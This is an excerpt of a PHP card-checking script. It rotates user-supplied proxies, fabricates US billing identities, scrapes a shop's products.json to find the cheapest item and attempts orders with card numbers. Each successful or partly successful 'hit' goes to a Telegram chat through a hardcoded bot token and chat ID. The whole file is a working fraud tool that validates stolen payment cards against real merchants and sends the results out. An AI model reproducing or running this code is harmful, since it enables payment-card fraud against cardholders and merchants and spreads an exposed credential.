...
// === ✅ PROXY HANDLER START ===
$customProxy = isset($_GET['proxy']) ? $_GET['proxy'] : null;

if (!$customProxy) {
    echo json_encode(['Response' => 'No proxy provided via &proxy=']);
    exit;
}

$proxyList = array_map('trim', explode(',', $customProxy));

foreach ($proxyList as $proxy) {
    if (substr_count($proxy, ':') < 3) {
        echo json_encode(['Response' => "Invalid proxy format: $proxy"]);
        exit;
    }
}
...
function getRandomProxy() {
    ...
    return compact('ip', 'port', 'user', 'pass');
}
...
/// hit sender 
$botToken = '8132662610:AAFZxb6yKeeEkjF0sB-Ze3HiZyT2DCE8rwI';  
$chatId = '-1002219865677';     

function sendHitToTelegram($botToken, $chatId, $message) {    
...
if ($yearcont <= 2) $year = "20$year";

$sub_month = ltrim($month, '0');

$geoaddress = urlencode("$num_us, $address_us, $city_us");

$lat = round(mt_rand(25000000, 49000000) / 1000000, 6); 
$lon = round(mt_rand(-124000000, -67000000) / 1000000, 6); 


$firstNames = ['James', 'Emily', 'John', 'Olivia', 'Robert', 'Sophia'];
$lastNames = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia'];

$firstname = $firstNames[array_rand($firstNames)];
$lastname = $lastNames[array_rand($lastNames)];
$email = "ytpremiumexpert@gmail.com";
...
$cookie = tempnam(sys_get_temp_dir(), 'cf_');


// 🔥 STEP 1: WARM-UP REQUEST (homepage)
$ch = curl_init($site2);
applyProxy($ch, $proxy);
...
// 🔥 STEP 2: PRODUCTS.JSON REQUEST (same proxy + cookie)
$ch = curl_init($site);
applyProxy($ch, $proxy);
...
if ($r1 === false) {
    echo json_encode(['Response' => curl_error($ch)]);
    curl_close($ch);
    exit;
}
...
if ($trim === '' || $trim[0] !== '{') {
    echo json_encode([
        'Response' => 'Cloudflare / Non-JSON response',
        'Preview' => substr($r1, 0, 200)
    ]);
    exit;
}
...
if (empty($minPriceProductId)) {
    echo json_encode(['Response' => 'Product id is empty']);
    exit;
}
...
if (
    ...
    // fclose($handle);
    $err = 'order confirmed 🔥 ';
    sendHitToTelegram($botToken, $chatId, "✅ <b>ORDER CONFIRMED</b>\n<code>$cc1</code>\n💰 Amount: $totalamt\n🔁 Gateway: $gateway");
    $result = json_encode([
        'Response' => $err,
        'Price' => $totalamt,
        'Gateway' => $gateway,
    ...
    sendHitToTelegram($botToken, $chatId, "💸 <b>CVV MATCH - OTP Required</b>\n<code>$cc1</code>\n💰 Amount: $totalamt\n🔁 Gateway: $gateway");
    $result = json_encode([
        'Response' => $err,
        'Price' => $totalamt,
        'Gateway' => $gateway,
    ...
    sendHitToTelegram($botToken, $chatId, "💸 <b>INSUFFICIENT FUNDS</b>\n<code>$cc1</code>\n💰 Amount: $totalamt\n🔁 Gateway: $gateway");
    $result = json_encode([
        'Response' => $err,
        'Price' => $totalamt,
        'Gateway' => $gateway,
